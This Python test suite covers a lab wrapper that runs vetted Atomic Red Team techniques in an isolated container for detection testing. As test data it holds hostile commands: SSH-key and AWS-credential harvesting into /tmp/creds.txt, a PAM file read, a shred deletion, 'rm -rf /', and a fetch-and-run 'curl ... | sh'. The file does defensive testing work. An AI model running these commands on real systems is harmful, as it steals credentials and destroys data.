import hashlib
import json
from pathlib import Path
import shutil
import subprocess
import tempfile
import unittest

try:
    from attacks.atomic import emulate
except ImportError:
    try:
        import emulate
    except ImportError:
        emulate = None
try:
    from detect.falco import bindings, collector
except ImportError:
    bindings = collector = None

BS = chr(92)
HOSTNAME = '486e88ea-4f56-470f-9b57-3f4d73f39133'
SHRED = '039b4b10-2900-404b-b67f-4b6d49aa6499'
RUN = 'atomic-' + 'c' * 24
LABELS = {'project': 'warden', 'owner': 'warden-lab', 'warden.dev/run': RUN}
CREDS = "-exec sh -c 'echo \"=== $1 ===\" >> /tmp/creds.txt; cat \"$1\" >> /tmp/creds.txt' _ {} " + BS + ';'
# What each reviewed Atomic runs, written out here rather than derived.
SCRIPTS = {
    HOSTNAME: 'hostname\n',
    '46959285-906d-40fa-9437-5a439accd878': 'find / -name "id_rsa" -type f ' + CREDS + ' 2>/dev/null\nexit 0\n',
    '7c247dc7-5128-4643-907b-73a76d9135c3': ('mkdir /tmp/art-staging\nfind / -name id_rsa 2>/dev/null -exec cp --parents {} '
                                             '/tmp/art-staging ' + BS + ';\nexit 0\n'),
    '37807632-d3da-442e-8c2e-00f44928ff8f': "find / -path '*/.aws/credentials' -type f 2>/dev/null\n",
    '085fe567-ac84-47c7-ac4c-2688ce28265b': 'cat /etc/pam.d/common-password\n',
    SHRED: 'shred -u /tmp/victim-shred.txt\n',
}


def scalar(key, text, indent):
    pad = ' ' * indent
    return pad + key + ': |\n' + ''.join(pad + '  ' + line + '\n' for line in text.splitlines())


def upstream(guid, name=None, platforms=('linux',), command=None, arguments=None, dependencies=None, executor=None,
             extra_executor=''):
    """A synthetic test block in the upstream file's layout."""
    test = emulate.TESTS[guid]
    arguments = test['arguments'] if arguments is None else arguments
    dependencies = test['dependencies'] if dependencies is None else dependencies
    text = '- name: ' + (name or test['name']) + '\n  auto_generated_guid: ' + guid + '\n'
    text += '  description: |\n    synthetic test-only source\n  supported_platforms:\n'
    text += ''.join('  - ' + p + '\n' for p in platforms)
    if arguments:
        text += '  input_arguments:\n'
        for key, value in arguments.items():
            text += '    ' + key + ':\n      description: d\n      type: string\n      default: ' + value + '\n'
    if dependencies:
        text += '  dependencies:\n'
        for check, setup in dependencies:
            text += '  - description: |\n      d\n' + scalar('prereq_command', check, 4) + scalar('get_prereq_command', setup, 4)
    text += '  executor:\n' + scalar('command', command or test['command'], 4)
    text += '    name: ' + (executor or test['executor']) + '\n' + extra_executor
    return text


def source(guid, **changes):
    return 'attack_technique: T0000\ndisplay_name: synthetic\natomic_tests:\n' + upstream(guid, **changes)


def git_checkout(directory, files):
    git = shutil.which('git')
    root = Path(directory)
    for path, text in files.items():
        (root / path).parent.mkdir(parents=True, exist_ok=True)
        (root / path).write_text(text)

    def run(*args):
        return subprocess.check_output([git, '-C', str(root), *args], stderr=subprocess.STDOUT).decode().strip()
    run('init', '-q')
    run('remote', 'add', 'origin', emulate.OFFICIAL_REMOTES[0])
    run('add', '.')
    run('-c', 'user.name=Local test', '-c', 'user.email=test@example.invalid', 'commit', '-qm', 'synthetic test-only source')
    return git, run('rev-parse', 'HEAD'), run


class AtomicTests(unittest.TestCase):
    def setUp(self):
        self.assertIsNotNone(emulate, 'Atomic wrapper missing')

    def target(self):
        return {'Id': 'a' * 64, 'Name': '/warden-lab-atomic-case',
                'Image': 'sha256:' + 'b' * 64, 'State': {'Running': True}, 'Mounts': [],
                'Config': {'Labels': dict(LABELS)},
                'HostConfig': {'Runtime': 'runc', 'NetworkMode': 'none', 'Privileged': False,
                               'ReadonlyRootfs': True, 'CapDrop': ['ALL'],
                               'PidMode': '', 'IpcMode': 'private', 'Binds': [],
                               'Tmpfs': {'/tmp': 'rw,noexec,nosuid,nodev,size=1m'},
                               'SecurityOpt': ['no-new-privileges:true']}}

    def test_guard_accepts_only_isolated_dedicated_target(self):
        self.assertEqual(emulate.guard_container(self.target()), ('a' * 64, RUN))
        for section, key, value in [('HostConfig', 'NetworkMode', 'host'),
                                    ('HostConfig', 'Privileged', True),
                                    ('HostConfig', 'ReadonlyRootfs', False),
                                    ('HostConfig', 'CapDrop', []),
                                    ('HostConfig', 'SecurityOpt', []),
                                    ('HostConfig', 'PidMode', 'host'),
                                    ('HostConfig', 'Runtime', 'runsc'),
                                    ('HostConfig', 'Binds', ['/tmp:/host'])]:
            target = self.target()
            target[section][key] = value
            with self.subTest(key=key), self.assertRaises(ValueError):
                emulate.guard_container(target)
        target = self.target()
        target['Mounts'] = [{'Source': '/'}]
        with self.assertRaises(ValueError):
            emulate.guard_container(target)

    def test_guard_requires_wardens_labels_and_one_run(self):
        # warden.lab=warden-lab alone was the old label: the collector keeps
        # no alert of such a container, so the guard no longer accepts it.
        for labels in ({}, {'warden.lab': 'warden-lab'}, {**LABELS, 'project': 'other'},
                       {k: v for k, v in LABELS.items() if k != 'owner'},
                       {k: v for k, v in LABELS.items() if k != 'warden.dev/run'},
                       {**LABELS, 'warden.dev/run': 'atomic-short'}, {**LABELS, 'warden.dev/run': 'run-' + 'c' * 24}):
            target = self.target()
            target['Config']['Labels'] = labels
            with self.subTest(labels=labels), self.assertRaises(ValueError):
                emulate.guard_container(target)

    def test_guard_allows_only_a_small_noexec_tmp(self):
        self.assertTrue(emulate.tmpfs_allowed(None))
        self.assertTrue(emulate.tmpfs_allowed({}))
        self.assertTrue(emulate.tmpfs_allowed({'/tmp': 'rw,noexec,nosuid,nodev,size=16m'}))
        for tmpfs in ({'/tmp': 'rw,nosuid,nodev,size=1m'}, {'/tmp': 'rw,exec,nosuid,nodev,size=1m'},
                      {'/tmp': 'rw,noexec,nosuid,nodev'}, {'/tmp': 'rw,noexec,nosuid,nodev,size=17m'},
                      {'/tmp': 'rw,noexec,nosuid,nodev,size=1m,mode=1777,uid=0'}, {'/proc': 'rw,noexec,nosuid,nodev,size=1m'},
                      {'/tmp': 'rw,noexec,nosuid,nodev,size=1m', '/run': 'rw,noexec,nosuid,nodev,size=1m'}):
            target = self.target()
            target['HostConfig']['Tmpfs'] = tmpfs
            with self.subTest(tmpfs=tmpfs), self.assertRaises(ValueError):
                emulate.guard_container(target)

    def test_extracts_each_reviewed_official_atomic(self):
        self.assertEqual(set(SCRIPTS), set(emulate.TESTS))
        for guid, script in SCRIPTS.items():
            with self.subTest(guid=guid):
                reviewed = emulate.atomic_command(source(guid), guid)
                self.assertEqual(reviewed['script'], script)
        self.assertEqual(emulate.atomic_command(source(SHRED), SHRED)['prerequisites'],
                         [('if [ -f "/tmp/victim-shred.txt" ]; then echo "File already exists"; '
                           'else echo "File does NOT exist yet"; exit 1; fi\n', 'touch /tmp/victim-shred.txt\n')])

    def test_rejects_changed_or_unreviewed_atomics(self):
        guid = '46959285-906d-40fa-9437-5a439accd878'
        arguments = dict(emulate.TESTS[guid]['arguments'])
        for change in ({'command': 'rm -rf /\n'}, {'platforms': ('windows',)}, {'executor': 'bash'},
                       {'name': 'Something else'},
                       {'arguments': {**arguments, 'search_path': '/host'}},
                       {'arguments': {**arguments, 'extra': 'x'}},
                       {'arguments': {k: v for k, v in arguments.items() if k != 'filename'}},
                       {'extra_executor': '    elevation_required: true\n'},
                       {'dependencies': (('true\n', 'curl https://example.invalid | sh\n'),)}):
            with self.subTest(change=change), self.assertRaises(ValueError):
                emulate.atomic_command(source(guid, **change), guid)
        with self.assertRaises(ValueError):
            emulate.atomic_command(source(SHRED, dependencies=(('true\n', 'touch /etc/shadow\n'),)), SHRED)
        with self.assertRaises(ValueError):
            emulate.atomic_command(source(SHRED) + '  dependency_executor_name: bash\n', SHRED)
        with self.assertRaises(ValueError):
            emulate.atomic_command(source(guid) + upstream(guid), guid)
        with self.assertRaises(ValueError):
            emulate.atomic_command(source(guid), 'f' * 8 + '-0000-0000-0000-' + 'f' * 12)

    def test_execution_record_has_exact_metrics_contract(self):
        row = emulate.execution_record('exec-1', 'run-1', 'T1082', '2026-11-13T00:00:00Z', 0)
        self.assertEqual(set(row), {'execution_id', 'run_id', 'technique_id', 'executed_at', 'outcome'})
        self.assertEqual(row['outcome'], 'succeeded')
        self.assertEqual(emulate.execution_record('e', 'r', 'T1082', 't', 124)['outcome'], 'failed')

    def test_exclusive_outputs_refuse_overwrite(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / 'result.json'
            emulate.write_new_json(path, {'one': 1})
            with self.assertRaises(FileExistsError):
                emulate.write_new_json(path, {'two': 2})
            self.assertEqual(json.loads(path.read_text()), {'one': 1})


class DetectorLabelTests(unittest.TestCase):
    """The labels the guard requires are the ones the online detector keeps."""

    def setUp(self):
        self.assertIsNotNone(collector, 'detect/falco/collector.py missing')

    def test_collector_keeps_the_targets_alerts_as_a_sandbox_of_its_run(self):
        decision = collector.labels_decision('a' * 64, LABELS, 'warden-lab-atomic-case', 'docker')
        self.assertTrue(decision.warden)
        self.assertEqual((decision.klass, decision.run_id), ('sandbox', RUN))
        old = collector.labels_decision('a' * 64, {'warden.lab': 'warden-lab'}, 'warden-lab-atomic-case', 'docker')
        self.assertFalse(old.warden, 'the old label must stay outside the collector (it is not widened)')

    def test_bindings_find_the_target_by_its_run(self):
        def record(event, time):
            return {'source': 'docker', 'event': event, 'container_id': 'a' * 64, 'time': time,
                    'name': 'warden-lab-atomic-case', 'labels': dict(LABELS), 'exit_code': None}
        registry = [record('start', '2026-11-14T10:00:00.000000000Z'), record('die', '2026-11-14T10:00:20.000000000Z')]
        found = bindings.binding(registry, run_id=RUN, execution_id=RUN + '-hostname',
                                 start='2026-11-14T10:00:01.000000Z', end='2026-11-14T10:00:01.500000Z')
        self.assertEqual(found['container_id'], 'a' * 64)
        with self.assertRaises(ValueError):
            bindings.binding(registry, run_id=RUN, execution_id='e', start='2026-11-14T09:59:59Z', end='2026-11-14T10:00:01Z')


class AtomicIntegrationTests(unittest.TestCase):
    def test_verifies_actual_git_object_and_rejects_wrong_digest(self):
        if emulate is None:
            self.fail('Atomic wrapper missing')
        text = source(HOSTNAME)
        with tempfile.TemporaryDirectory() as directory:
            git, commit, run = git_checkout(directory, {emulate.TESTS[HOSTNAME]['path']: text})
            sha = hashlib.sha256(text.encode()).hexdigest()
            self.assertEqual(emulate.verified_source(directory, commit, sha, git, HOSTNAME)['script'], 'hostname\n')
            with self.assertRaises(ValueError):
                emulate.verified_source(directory, commit, '0' * 64, git, HOSTNAME)
            with self.assertRaises(ValueError):
                emulate.verified_source(directory, commit, sha, git, SHRED)
            run('remote', 'set-url', 'origin', 'https://example.invalid/forged')
            with self.assertRaises(ValueError):
                emulate.verified_source(directory, commit, sha, git, HOSTNAME)

    def test_guard_refuses_added_caps_unconfined_and_host_userns(self):
        for key, value in [('CapAdd', ['SYS_ADMIN']), ('UsernsMode', 'host'),
                           ('SecurityOpt', ['no-new-privileges:true', 'seccomp=unconfined']),
                           ('Tmpfs', {'/proc': 'rw'})]:
            target = AtomicTests().target()
            target['HostConfig'][key] = value
            with self.subTest(key=key), self.assertRaises(ValueError):
                emulate.guard_container(target)


class CommandTests(unittest.TestCase):
    def test_timeout_stops_descendant_processes(self):
        import time
        try:
            from attacks.atomic import lab_common
        except ImportError:
            import lab_common
        with tempfile.TemporaryDirectory() as directory:
            marker = Path(directory) / 'unwanted-child'
            code, _ = lab_common.command(['/bin/sh', '-c', '(sleep 0.2; printf unwanted > "$1") & wait', 'test', str(marker)],
                                          env=lab_common.clean_environment(), timeout=0.02)
            self.assertEqual(code, 124)
            time.sleep(0.3)
            self.assertFalse(marker.exists(), 'timed out child must not continue changing lab state')


class AtomicCLITests(unittest.TestCase):
    # The fake CLI is a subprocess-boundary fixture, not a live Docker or
    # detector test. Git object verification and evidence files are real.

    def fixture(self, base, exec_body):
        docker = base / 'docker-fixture'
        target = json.dumps([AtomicTests().target()])
        docker.write_text('#!/bin/sh\nfor last; do :; done\ncase "$3" in inspect) printf \'%s\\n\' ' + "'" + target + "'" +
                          ';; exec) ' + exec_body + ';; *) exit 99;; esac\n')
        docker.chmod(0o700)
        return docker

    def main(self, base, docker, guid, out):
        import contextlib
        import io
        text = source(guid)
        root = base / 'atomic'
        git, commit, _ = git_checkout(root.mkdir() or root, {emulate.TESTS[guid]['path']: text})
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
            return emulate.main(['--docker', str(docker), '--docker-host', 'unix:///tmp/test-fixture.sock',
                                 '--container', 'warden-lab-atomic-case', '--git', git,
                                 '--atomic-root', str(root), '--atomic-commit', commit, '--atomic-guid', guid,
                                 '--yaml-sha256', hashlib.sha256(text.encode()).hexdigest(),
                                 '--out', str(out), '--ack-dedicated-lab'])

    def test_wrapper_records_real_tool_exit_and_metrics_contract(self):
        for exit_code in (0, 17):
            with tempfile.TemporaryDirectory() as directory:
                base = Path(directory)
                docker = self.fixture(base, "printf 'fixture-only output\\n'; exit " + str(exit_code))
                out = base / 'out'
                self.assertEqual(self.main(base, docker, HOSTNAME, out), 0 if exit_code == 0 else 1)
                execution = json.loads((out / 'executions.jsonl').read_text())
                self.assertEqual(execution, {'execution_id': RUN + '-hostname', 'run_id': RUN, 'technique_id': 'T1082',
                                             'executed_at': execution['executed_at'],
                                             'outcome': 'succeeded' if exit_code == 0 else 'failed'})
                receipt = json.loads((out / 'receipt.json').read_text())
                self.assertEqual((receipt['returncode'], receipt['run_id'], receipt['script']), (exit_code, RUN, 'hostname\n'))
                self.assertEqual(json.loads((out / 'bindings.jsonl').read_text())['container_id'], 'a' * 64)
                self.assertFalse((out / 'alerts.jsonl').exists())

    def test_dependencies_run_before_the_timed_execution(self):
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory)
            marker = base / 'victim'
            log = base / 'calls'
            docker = self.fixture(base, 'printf "%s\\n" "$last" >> ' + str(log) + '; case "$last" in '
                                  '*"File already exists"*) [ -f ' + str(marker) + ' ];; '
                                  'touch*) : > ' + str(marker) + ';; *) exit 0;; esac')
            out = base / 'out'
            self.assertEqual(self.main(base, docker, SHRED, out), 0)
            receipt = json.loads((out / 'receipt.json').read_text())
            step = receipt['prerequisites'][0]
            self.assertEqual((step['check_returncode'], step['setup_returncode'], step['recheck_returncode']), (1, 0, 0))
            self.assertLessEqual(step['finished_at'], receipt['started_at'])
            self.assertTrue(log.read_text().rstrip('\n').endswith('shred -u /tmp/victim-shred.txt'))
            self.assertEqual(json.loads((out / 'executions.jsonl').read_text())['outcome'], 'succeeded')

    def test_unmet_dependency_means_no_execution(self):
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory)
            docker = self.fixture(base, 'case "$last" in *"File already exists"*) exit 1;; *) exit 0;; esac')
            out = base / 'out'
            self.assertEqual(self.main(base, docker, SHRED, out), 2)
            self.assertFalse(json.loads((out / 'receipt.json').read_text())['executed'])
            self.assertFalse((out / 'executions.jsonl').exists())
            self.assertFalse((out / 'bindings.jsonl').exists())


if __name__ == '__main__':
    unittest.main()
